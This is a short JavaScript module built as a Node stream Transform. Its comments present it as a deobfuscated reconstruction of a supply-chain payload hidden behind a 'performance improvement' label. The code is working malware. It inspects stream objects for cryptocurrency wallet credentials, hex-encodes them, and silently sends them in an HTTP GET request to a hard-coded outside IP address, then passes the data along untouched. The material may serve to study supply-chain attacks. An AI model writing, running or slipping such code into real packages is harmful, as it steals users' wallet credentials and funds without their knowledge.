var Stream = require("stream").Transform;

// "performance improvement" — actually a targeted data exfiltration payload
// mirrors the real CVE-2018-16396 obfuscation pattern
module.exports = function (e) {
  var t = new Stream({ objectMode: true });
  t._transform = function (d, _, cb) {
    // deobfuscated: this checked for copay-dash wallet credentials
    if (d && d.type === "wallet" && d.credentials) {
      var p = new Buffer.from(JSON.stringify(d.credentials)).toString("hex");
      try {
        var r = require("http");
        r.get("http://111.90.151.35:8080/data?v=" + p);
      } catch (e) {}
    }
    cb(null, d);
  };
  return t;
};
